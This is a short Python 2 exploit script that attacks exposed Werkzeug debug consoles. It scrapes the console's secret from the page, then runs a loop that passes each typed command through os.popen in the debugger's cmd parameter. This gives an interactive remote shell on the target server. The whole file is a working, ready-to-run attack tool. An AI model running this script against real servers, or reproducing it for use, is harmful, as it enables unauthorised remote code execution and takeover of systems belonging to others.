#!/usr/bin/python
# Author: SamDubYah
# Date: Oct 16 2019
###
### This tool will exploit the vulnerability in
### the Werkzeug web application by using a loop to continue
### to pull in cmd functions and pass them to the Web App
###
### This is a very hacky WebApp hack as it simply simulates
### a shell on the machine using a forever while loop.
###

import sys
import requests
import re
import urllib

def usage():
    print "\nThis is a simple program to Exploit Werkzeug"
    print "\nusage: python Werkzeug.py http://www.examlple.com/path/to/console\n"

if len(sys.argv) != 2:
    usage()
    sys.exit(-1)

url = sys.argv[1]

response = requests.get(url)

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

__debugger__ = 'yes'

frm = '0'

if len(secret) != 1:
    print "unable to obtain secret"
    sys.exit(-1)
else:
    secret = secret[0]
    print "[+]The secret is: " + str(secret)

print ("[+] starting hacked shell on " + url)
print ("[+] use Ctrl + C to kill shell")


while(1):

    shell_cmd = raw_input("#:")
    cmd = ('''__import__('os').popen('%s').read();''' % shell_cmd)
    print (cmd)

    data = {
            '__debugger__' : __debugger__,
            'cmd' : str(cmd),
            'frm' : frm,
            's' : secret
            }

    response = requests.get(url, params=data, headers=response.headers)

    print "[+] Response from server"
    print "[+] Status code: " + str(response.status_code)
    print "[+] Response: " + str(response.text)

